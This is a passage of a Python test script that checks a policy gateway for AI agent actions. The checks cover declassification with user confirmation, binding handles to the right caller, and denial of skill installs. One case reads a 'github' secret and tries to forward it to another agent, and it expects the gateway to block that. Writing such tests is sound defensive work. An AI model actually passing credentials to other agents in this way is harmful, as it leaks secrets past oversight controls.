        inputs={"handle": recv_payload, "purpose": "review"},
        constraints={"user_confirm": True},
        auth=True,
    )
    inter_dec_yes_data = (inter_dec_yes_body.get("data") or {}) if isinstance(inter_dec_yes_body, dict) else {}
    results.append(
        CheckResult(
            "interagent_receiver_declassify_with_confirm",
            int(inter_dec_yes_status) == 200
            and isinstance(inter_dec_yes_body, dict)
            and inter_dec_yes_body.get("status") == "OK"
            and inter_dec_yes_body.get("reason_code") == "ALLOW"
            and bool(inter_dec_yes_data.get("text_preview")),
            {
                "status_code": int(inter_dec_yes_status),
                "status": inter_dec_yes_body.get("status") if isinstance(inter_dec_yes_body, dict) else None,
                "reason_code": inter_dec_yes_body.get("reason_code") if isinstance(inter_dec_yes_body, dict) else None,
                "preview_len": len(str(inter_dec_yes_data.get("text_preview") or "")),
            },
        )
    )

    inter_cap_status, inter_cap_body = _http_call(
        "validate-interagent-cap",
        intent_id="ReadSecret",
        caller="nanoclaw",
        inputs={"name": "github"},
        auth=True,
    )
    inter_cap_handle = ""
    if isinstance(inter_cap_body, dict) and inter_cap_body.get("artifacts"):
        inter_cap_handle = str(((inter_cap_body.get("artifacts") or [{}])[0]).get("handle") or "")
    inter_cap_send_status, inter_cap_send_body = _http_call(
        "validate-interagent-cap",
        intent_id="SendInterAgentMessage",
        caller="nanoclaw",
        inputs={"to_agent": "alice-agent", "payload_handle": inter_cap_handle},
        auth=True,
    )
    results.append(
        CheckResult(
            "interagent_capability_handle_sink_blocked",
            int(inter_cap_send_status) == 200
            and isinstance(inter_cap_send_body, dict)
            and inter_cap_send_body.get("status") == "DENY"
            and inter_cap_send_body.get("reason_code") == "HANDLE_SINK_BLOCKED",
            {
                "status_code": int(inter_cap_send_status),
                "status": inter_cap_send_body.get("status") if isinstance(inter_cap_send_body, dict) else None,
                "reason_code": inter_cap_send_body.get("reason_code") if isinstance(inter_cap_send_body, dict) else None,
            },
        )
    )

    skill_path = str(ROOT / "integrations" / "openclaw_workspace" / "skills" / "mirage-ogpp")
    skill_imp_status, skill_imp_body = _http_call(
        "validate-skill",
        intent_id="ImportSkill",
        caller="nanoclaw",
        inputs={"path": skill_path, "skill_id_hint": "mirage-ogpp-test"},
        auth=True,
    )
    skill_handle = ""
    if isinstance(skill_imp_body, dict) and skill_imp_body.get("artifacts"):
        skill_handle = str(((skill_imp_body.get("artifacts") or [{}])[0]).get("handle") or "")
    results.append(
        CheckResult(
            "skill_import_returns_handle",
            int(skill_imp_status) == 200
            and isinstance(skill_imp_body, dict)
            and skill_imp_body.get("status") == "OK"
            and skill_imp_body.get("reason_code") == "SKILL_IMPORTED"
            and bool(skill_handle),
            {
                "status_code": int(skill_imp_status),
                "status": skill_imp_body.get("status") if isinstance(skill_imp_body, dict) else None,
                "reason_code": skill_imp_body.get("reason_code") if isinstance(skill_imp_body, dict) else None,
                "has_handle": bool(skill_handle),
            },
        )
    )

    skill_desc_status, skill_desc_body = _http_call(
        "validate-skill",
        intent_id="DescribeSkill",
        caller="nanoclaw",
        inputs={"handle": skill_handle},
        auth=True,
    )
    skill_desc_data = (skill_desc_body.get("data") or {}) if isinstance(skill_desc_body, dict) else {}
    results.append(
        CheckResult(
            "skill_describe_same_caller",
            int(skill_desc_status) == 200
            and isinstance(skill_desc_body, dict)
            and skill_desc_body.get("status") == "OK"
            and skill_desc_body.get("reason_code") == "ALLOW"
            and bool(skill_desc_data.get("skill_md_sanitized")),
            {
                "status_code": int(skill_desc_status),
                "status": skill_desc_body.get("status") if isinstance(skill_desc_body, dict) else None,
                "reason_code": skill_desc_body.get("reason_code") if isinstance(skill_desc_body, dict) else None,
                "sanitized_len": len(str(skill_desc_data.get("skill_md_sanitized") or "")),
            },
        )
    )

    skill_desc_bad_status, skill_desc_bad_body = _http_call(
        "validate-skill",
        intent_id="DescribeSkill",
        caller="codex",
        inputs={"handle": skill_handle},
        auth=True,
    )
    results.append(
        CheckResult(
            "skill_handle_caller_binding",
            int(skill_desc_bad_status) == 200
            and isinstance(skill_desc_bad_body, dict)
            and skill_desc_bad_body.get("status") == "DENY"
            and skill_desc_bad_body.get("reason_code") == "HANDLE_CALLER_MISMATCH",
            {
                "status_code": int(skill_desc_bad_status),
                "status": skill_desc_bad_body.get("status") if isinstance(skill_desc_bad_body, dict) else None,
                "reason_code": skill_desc_bad_body.get("reason_code") if isinstance(skill_desc_bad_body, dict) else None,
            },
        )
    )

    skill_chk_status, skill_chk_body = _http_call(
        "validate-skill",
        intent_id="CheckSkillInstallPolicy",
        caller="nanoclaw",
        inputs={"handle": skill_handle},
        auth=True,
    )
    results.append(
        CheckResult(
            "skill_install_policy_denied_for_nanoclaw",
            int(skill_chk_status) == 200
            and isinstance(skill_chk_body, dict)
            and skill_chk_body.get("status") == "DENY"
            and skill_chk_body.get("reason_code") == "POLICY_DENY",
            {
                "status_code": int(skill_chk_status),
                "status": skill_chk_body.get("status") if isinstance(skill_chk_body, dict) else None,
                "reason_code": skill_chk_body.get("reason_code") if isinstance(skill_chk_body, dict) else None,
            },
        )
    )

    ok = all(r.ok for r in results)
    return {
        "ok": ok,
        "results": [r.to_dict() for r in results],
    }


def main() -> int:
    try:
        report = run_validation()
    except McpError as e:
        print(json.dumps({"ok": False, "fatal": f"MCP error: {e}"}, indent=2))
        return 1
    except Exception as e:
        print(json.dumps({"ok": False, "fatal": repr(e)}, indent=2))
        return 1

    print(json.dumps(report, indent=2))
    return 0 if report.get("ok") else 1


if __name__ == "__main__":
    raise SystemExit(main())
